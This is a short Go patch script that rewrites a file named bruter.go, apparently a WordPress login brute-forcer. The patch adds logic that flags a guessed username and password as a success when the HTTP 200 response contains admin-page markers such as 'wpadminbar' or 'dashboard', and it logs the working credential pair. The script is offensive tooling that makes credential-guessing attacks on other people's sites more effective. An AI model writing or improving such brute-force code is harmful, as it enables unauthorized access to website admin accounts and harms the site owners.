package main

import (
	"fmt"
	"os"
	"strings"
)

func main() {
	content, _ := os.ReadFile("bruter.go")
	text := string(content)

	oldCode := `	diagLog("FAIL", j.Site, fmt.Sprintf("%s:%s - wrong credentials", user, pass))
	return outFail, ""
}`

	newCode := `	// Also check for success on 200 status (direct admin page, no redirect)
	if status == fasthttp.StatusOK {
		body := resp.Body()
		if len(body) > 0 {
			sample := strings.ToLower(string(body[:min(len(body), 32768)]))
			for _, sig := range []string{
				"dashboard", "adminmenu", "wpadminbar",
				"screen-meta", "wpbody-content", "wp-toolbar",
				"admin-bar", "wp-heading-inline",
			} {
				if strings.Contains(sample, sig) {
					diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - admin page detected (200)", user, pass))
					return outSuccess, ""
				}
			}
		}
	}
	
	diagLog("FAIL", j.Site, fmt.Sprintf("%s:%s - wrong credentials", user, pass))
	return outFail, ""
}`

	if strings.Contains(text, oldCode) && !strings.Contains(text, "admin page detected") {
		text = strings.Replace(text, oldCode, newCode, 1)
		os.WriteFile("bruter.go", []byte(text), 0644)
		fmt.Println("✅ Fix applied")
	} else {
		fmt.Println("❌ Could not apply fix")
	}
}
